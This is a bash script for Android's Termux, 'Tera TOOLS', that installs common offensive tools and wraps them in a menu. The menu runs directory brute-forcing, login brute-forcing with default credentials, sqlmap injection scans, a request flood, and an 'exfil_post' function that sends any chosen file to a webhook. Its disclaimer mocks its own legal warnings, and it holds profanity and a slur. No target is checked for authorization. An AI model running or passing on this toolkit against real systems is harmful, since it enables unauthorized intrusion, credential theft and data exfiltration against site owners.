#!/data/data/com.termux/files/usr/bin/bash

show_disclaimer() {
    clear
    echo "========================================================"
    echo "           Tera TOOLS"
    echo "========================================================"
    echo ""
    echo ""
    echo "If you get cought bitch its not my fault."
    echo ""
    echo "Unauthorized access to computer systems is:"
    echo "- ILLEGAL in most countries"
    echo "- Unethical"
    echo "- Punishable by fines and imprisonment"
    echo ""
    echo "By using this tool, you agree to:"
    echo "1. Use it only for legal, authorized security testing"
    echo "2. Not attack systems without written permission"
    echo "3. Follow responsible disclosure pONLYractionlyces"
    echo "(writing ts cuz i dont wanna go to jail btw)"
    echo "Recommended legal practice environments:"
    echo "- TryHackMe, HackTheBox, VulnHub"
    echo "- DVWA, WebGoat, bWAPP"
    echo "- so bitch if u get agree and get cought by fbi its not my fault dumbass"
    echo "========================================================"
    echo ""
    
    read -p "Type 'y' to continue or anything else to exit: " consent
    if [[ "$consent" != "y" ]]; then
        echo "Exiting. Stay legal and and not get cought bitchhhh!"
        exit 0
    fi
}

# Setup Termux repositories
setup_repositories() {
    echo "[+] Setting up Termux repositories..."
    if ! command -v termux-change-repo >/dev/null 2>&1; then
        echo "Installing termux-tools..."
        pkg install termux-tools -y
    fi
    
    echo "Please select repositories:"
    echo "1. Grimler (Recommended)"
    echo "2. Main"
    echo "3. Skip (if already configured)"
    read -p "Choice [1-3]: " repo_choice
    
    case $repo_choice in
        1)
            termux-change-repo
            ;;
        2)
            sed -i 's@^deb.*https://.*$@deb https://packages.termux.org/apt/termux-main stable main@' $PREFIX/etc/apt/sources.list 2>/dev/null
            ;;
    esac
    
    pkg update -y && pkg upgrade -y
    pkg install -y curl wget python python-pip git golang -y
}

# Install missing tools
install_missing_tools() {
    echo "[+] Installing missing tools..."
    
    # Update and install basic packages
    pkg update -y && pkg upgrade -y
    
    # Install from Termux repos
    pkg install -y python python-pip git curl wget nmap hydra nikto ruby -y
    
    # Setup Go environment
    if ! command -v go >/dev/null 2>&1; then
        echo "Installing Go..."
        pkg install golang -y
    fi
    
    export GOPATH=$HOME/go
    export PATH=$PATH:$GOPATH/bin
    
    # Install Go tools
    install_gotool() {
        local tool=$1
        local repo=$2
        
        if ! command -v $tool >/dev/null 2>&1; then
            echo "Installing $tool..."
            go install $repo@latest
            if [ -f $GOPATH/bin/$tool ]; then
                cp $GOPATH/bin/$tool $PREFIX/bin/ 2>/dev/null || true
            fi
        fi
    }
    
    # Install Python tools
    install_pytool() {
        local tool=$1
        local pkg=$2
        
        if ! command -v $tool >/dev/null 2>&1; then
            echo "Installing $tool..."
            pip install $pkg --break-system-packages
        fi
    }
    
    # List of tools to install
    echo "Checking and installing tools..."
    
    # Go tools
    install_gotool "gobuster" "github.com/OJ/gobuster/v3"
    install_gotool "nuclei" "github.com/projectdiscovery/nuclei/v3/cmd/nuclei"
    install_gotool "ffuf" "github.com/ffuf/ffuf"
    
    # Python tools
    install_pytool "sqlmap" "sqlmap"
    install_pytool "wfuzz" "wfuzz"
    
    # Ruby tools
    if ! command -v whatweb >/dev/null 2>&1; then
        echo "Installing WhatWeb..."
        gem install whatweb || pip install whatweb
    fi
    
    # Create directories
    mkdir -p /sdcard/wordlists /sdcard/nuclei-templates /sdcard/output 2>/dev/null
    
    # Download sample wordlists
    if [ ! -f /sdcard/wordlists/common.txt ]; then
        echo "Downloading sample wordlists..."
        curl -s -o /sdcard/wordlists/common.txt https://gist.githubusercontent.com/jhaddix/86a06c5dc309d08580a018c66354a056/raw/96f4e51d96b2203f19f6381c8c545b278eaa0837/all.txt 2>/dev/null || true
        cp /sdcard/wordlists/common.txt /sdcard/wordlists/dirbuster.txt 2>/dev/null || true
        cp /sdcard/wordlists/common.txt /sdcard/wordlists/fuzz.txt 2>/dev/null || true
    fi
    
    echo "[+] Installation complete!"
}

# Check dependencies with auto-install option
check_dependencies() {
    echo "[+] Checking dependencies..."
    
    local missing_tools=()
    
    # List of required tools
    declare -A tools=(
        ["curl"]="curl"
        ["wget"]="wget"
        ["python3"]="python"
        ["git"]="git"
        ["nmap"]="nmap"
        ["nikto"]="nikto"
    )
    
    # List of optional tools (will try to install)
    declare -A optional_tools=(
        ["gobuster"]="gobuster"
        ["whatweb"]="whatweb"
        ["wfuzz"]="wfuzz"
        ["sqlmap"]="sqlmap"
        ["nuclei"]="nuclei"
        ["ffuf"]="ffuf"
    )
    
    # Check required tools
    for tool in "${!tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            echo "[-] Missing required tool: $tool"
            missing_tools+=("${tools[$tool]}")
        fi
    done
    
    # Check optional tools
    local optional_missing=()
    for tool in "${!optional_tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            optional_missing+=("$tool")
        fi
    done
    
    # Handle missing tools
    if [ ${#missing_tools[@]} -gt 0 ]; then
        echo ""
        echo "Missing required tools: ${missing_tools[*]}"
        read -p "Install missing tools? (y/n): " install_choice
        if [[ "$install_choice" =~ ^[Yy]$ ]]; then
            setup_repositories
            pkg install ${missing_tools[@]} -y
        else
            echo "Cannot continue without required tools."
            exit 1
        fi
    fi
    
    if [ ${#optional_missing[@]} -gt 0 ]; then
        echo ""
        echo "Missing optional tools: ${optional_missing[*]}"
        read -p "Install optional tools? (y/n): " install_opt
        if [[ "$install_opt" =~ ^[Yy]$ ]]; then
            install_missing_tools
        else
            echo "Some features may not work without these tools."
        fi
    fi
    
    echo "[+] Dependencies check complete!"
}

# Your original functions (slightly modified for better error handling)
clear_screen() {
    clear
    tput civis 2>/dev/null || true
}

draw_menu() {
    cat <<'EOF'
╭──────────────────────────────────────╮
│ TERA TOOLS           │
│ I love yall so much│ 
├──────────────────────────────────────┤
│ 1. Recon / Information Gathering    
│ 2. Login Testing (bypassed)  
│ 3. Vulnerability Assessment              
│ 4. Data Testing                     
│ 5. Load Testing (bypassed)   
│ 6. Security Awareness Testing       
│                                     
│ [i] Install/Update Tools            
│ [0] Exit                            
╰──────────────────────────────────────╯
EOF
}

spinner() {
    local msg="$1"
    local pid=$2
    spin='|/-\'
    i=0
    while kill -0 $pid 2>/dev/null; do
        i=$(( (i+1) % 4 ))
        printf "\r%s %s" "${spin:$i:1}" "$msg"
        sleep 0.1
    done
    printf "\r%s\r" " "  # Clear line
}

# 1. RECON TOOLS
recon_dirscan() {
    echo "Target URL (http://example.com):"
    read -r target
    
    # Validate URL format
    if [[ ! "$target" =~ ^https?:// ]]; then
        target="http://$target"
    fi
    
    echo "Using wordlist: /sdcard/wordlists/dirbuster.txt"
    
    if command -v gobuster >/dev/null 2>&1; then
        gobuster dir -u "$target" -w /sdcard/wordlists/dirbuster.txt -t 20 -x php,html,js,txt --no-error
    else
        echo "Gobuster not found. Using alternative method..."
        if command -v ffuf >/dev/null 2>&1; then
            ffuf -u "$target/FUZZ" -w /sdcard/wordlists/dirbuster.txt -mc 200,301,302,403
        else
            echo "Please install Gobuster or FFUF first."
        fi
    fi
}

recon_techscan() {
    echo "Target URL:"
    read -r target
    
    if command -v whatweb >/dev/null 2>&1; then
        whatweb -a 3 "$target"
    else
        echo "WhatWeb not found. Using curl for basic info..."
        curl -I -L "$target" 2>/dev/null | head -20
    fi
}

# 2. LOGIN TESTING (bypassed)
bruteforce_http() {
    echo "WARNING: you can get in jail suprise dumbass!"
    echo ""
    echo "Target URL (http://example.com/login.php):"
    read -r url
    echo "Username parameter (default: username):"
    read -r user_param
    user_param=${user_param:-username}
    echo "Password parameter (default: password):"
    read -r pass_param
    pass_param=${pass_param:-password}
    
    echo "Use built-in wordlists or custom?"
    echo "1. Built-in (small test list)"
    echo "2. Custom file path"
    read -p "Choice [1-2]: " list_choice
    
    if [ "$list_choice" == "1" ]; then
        # Create a tiny test wordlist
        echo -e "admin\nuser\ntest\nadmin123" > /tmp/users.txt
        echo -e "password\n123456\nadmin\npassword123" > /tmp/passwords.txt
        users="/tmp/users.txt"
        passes="/tmp/passwords.txt"
    else
        echo "User wordlist path:"
        read -r users
        echo "Password wordlist path:"
        read -r passes
    fi
    
    if command -v wfuzz >/dev/null 2>&1; then
        wfuzz -c -z file,"$users" -z file,"$passes" --hc 404 -d "${user_param}=FUZZ&${pass_param}=FUZ2Z" "$url"
    else
        echo "WFuzz not found. Using basic curl testing..."
        # Simple test with common credentials
        common_creds=("admin:admin" "admin:password" "test:test")
        for cred in "${common_creds[@]}"; do
            IFS=':' read -r u p <<< "$cred"
            response=$(curl -s -o /dev/null -w "%{http_code}" -d "${user_param}=${u}&${pass_param}=${p}" "$url")
            echo "Testing $u:$p - HTTP Code: $response"
        done
    fi
}

# 3. VULNERABILITY ASSESSMENT
vuln_nikto() {
    echo "Target URL:"
    read -r target
    
    if command -v nikto >/dev/null 2>&1; then
        nikto -h "$target" -Tuning 123bde -o /sdcard/output/nikto_scan.txt
        echo "Results saved to /sdcard/output/nikto_scan.txt"
        cat /sdcard/output/nikto_scan.txt | head -50
    else
        echo "Nikto not installed. Install with: pkg install nikto"
    fi
}

vuln_sqlmap() {
    echo "Test URL with parameters (http://example.com/page?id=1):"
    read -r url
    
    if command -v sqlmap >/dev/null 2>&1; then
        echo "Running basic SQLMap scan..."
        sqlmap -u "$url" --batch --risk=1 --level=1
    else
        echo "SQLMap not installed. Install with: pip install sqlmap"
    fi
}

# 4. DATA TESTING
exfil_post() {
    echo "Webhook URL or test endpoint:"
    read -r webhook
    echo "Test data (or file path):"
    read -r data
    
    if [ -f "$data" ]; then
        curl -X POST -H "Content-Type: application/json" -d "@$data" "$webhook"
    else
        curl -X POST -H "Content-Type: application/json" -d "{\"test\": \"data\", \"timestamp\": \"$(date)\", \"tool\": \"tera-framework\"}" "$webhook"
    fi
    
    echo -e "\nTest completed. Check if data was received."
}

# 5. LOAD TESTING (bypassed)
flood_glow() {
    echo "WARNING: you can get in jail retardo!"
    echo "This is for LOAD TESTING only, not for DDoS attacks!"
    echo ""
    echo "Target URL (your test server):"
    read -r target
    echo "Number of requests (default: 10):"
    read -r workers
    workers=${workers:-10}
    
    if [ $workers -gt 100 ]; then
        echo "Limiting to 100 requests for safety..."
        workers=100
    fi
    
    echo "Starting load test with $workers requests..."
    for i in $(seq 1 $workers); do
        curl -s "$target" >/dev/null &
        echo -n "."
    done
    wait
    echo -e "\nLoad test completed."
}

# 6. SECURITY AWARENESS TESTING
phish_set() {
    echo "WARNING: you can go to jail dummasss!"
    echo ""
    echo "Security awareness testing options:"
    echo "1. Test email templates (display only)"
    echo "2. Educational phishing awareness"
    echo "3. Exit"
    
    read -p "Choice [1-3]: " phish_choice
    
    case $phish_choice in
        1)
            echo "Sample phishing test templates:"
            echo "--------------------------------"
            echo "Template 1: Password Reset Required"
            echo "Template 2: Security Alert"
            echo "Template 3: Account Verification"
            echo ""
            echo "These are for EDUCATIONAL PURPOSES !"
            ;;
        2)
            echo "Phishing Awareness Tips:"
            echo "1. Check sender email addresses"
            echo "2. Hover over links before clicking"
            echo "3. Look for spelling/grammar errors"
            echo "4. Never enter passwords from email links"
            echo "5. Verify through official channels"
            ;;
        3)
            return
            ;;
    esac
}

# Additional tools
nuclei_scan() {
    echo "Target URL:"
    read -r target
    
    if command -v nuclei >/dev/null 2>&1; then
        nuclei -u "$target" -t /sdcard/nuclei-templates/ -o /sdcard/output/nuclei_scan.txt
        echo "Results saved to /sdcard/output/nuclei_scan.txt"
    else
        echo "Nuclei not installed. Install Go tools first."
    fi
}

ffuf_vuln() {
    echo "Target URL (with FUZZ placeholder):"
    read -r target
    
    if command -v ffuf >/dev/null 2>&1; then
        ffuf -u "$target" -w /sdcard/wordlists/fuzz.txt -mc 200,301,302,307 -o /sdcard/output/ffuf_scan.json
        echo "Results saved to /sdcard/output/ffuf_scan.json"
    else
        echo "FFUF not installed. Install Go tools first."
    fi
}

# Main menu
main_menu() {
    while true; do
        clear_screen
        draw_menu
        tput cup 15 0
        read -p "Select option: " opt
        
        case "$opt" in
            0) 
                echo "Exiting..."; 
                tput cnorm 2>/dev/null; 
                exit 0 
                ;;
            i|I)
                echo "Installing/updating tools..."
                setup_repositories
                install_missing_tools
                read -p "Press Enter to continue..."
                ;;
            1)
                clear_screen
                cat <<'EOF'
1. RECONNAISSANCE / INFORMATION GATHERING
GET requests for authorized enumeration:
- Discover hidden pages
- Identify admin panels
- Fingerprint technologies
- Map site structure

Goal: Understand target surface (AUTHORIZED )
EOF
                echo "[1a] Directory enumeration"
                recon_dirscan
                echo ""
                echo "[1b] Technology fingerprinting"
                recon_techscan
                read -p "Press Enter to continue..."
                ;;
            2)
                clear_screen
                cat <<'EOF'
2. LOGIN TESTING (AUTHORIZED SYSTEMS ONLY)
POST requests for authorized credential testing:
- Test login forms
- Check password policies
- Identify weak authentication

Goal: Improve authentication security
EOF
                bruteforce_http
                read -p "Press Enter to continue..."
                ;;
            3)
                clear_screen
                cat <<'EOF'
3. VULNERABILITY ASSESSMENT
Authorized vulnerability scanning:
- SQL injection testing
- Security misconfigurations
- Common web vulnerabilities

Goal: Identify and fix security issues
EOF
                echo "[3a] Nikto web scanner"
                vuln_nikto
                echo ""
                echo "[3b] SQL injection testing"
                vuln_sqlmap
                read -p "Press Enter to continue..."
                ;;
            4)
                clear_screen
                cat <<'EOF'
4. DATA TRANSFER TESTING
Testing data transmission:
- API endpoint testing
- Webhook validation
- Data format verification

Goal: Ensure secure data handling
EOF
                exfil_post
                read -p "Press Enter to continue..."
                ;;
            5)
                clear_screen
                cat <<'EOF'
5. LOAD TESTING 
Controlled load testing:
- Server capacity testing
- Resource usage monitoring
- Performance benchmarking

Goal: Measure system resilience
EOF
                flood_glow
                read -p "Press Enter to continue..."
                ;;
            6)
                clear_screen
                cat <<'EOF'
6. SECURITY AWARENESS TESTING
Educational content:
- Phishing awareness
- Security best practices
- Threat identification

Goal: Improve security awareness
EOF
                phish_set
                read -p "Press Enter to continue..."
                ;;
            *)
                echo "Invalid option. Try again."
                sleep 1
                ;;
        esac
    done
}

# Initialize
show_disclaimer
check_dependencies

echo "Creating necessary directories..."
mkdir -p /sdcard/wordlists /sdcard/nuclei-templates /sdcard/output 2>/dev/null

# Check if wordlists exist, create minimal ones if not
if [ ! -f /sdcard/wordlists/common.txt ]; then
    echo "Creating sample wordlists..."
    cat > /sdcard/wordlists/dirbuster.txt << 'EOF'
admin
login
dashboard
wp-admin
wp-login
test
api
dev
backup
config
EOF
    cp /sdcard/wordlists/dirbuster.txt /sdcard/wordlists/fuzz.txt
fi

echo "Starting Tera Framework..."
sleep 1
main_menu
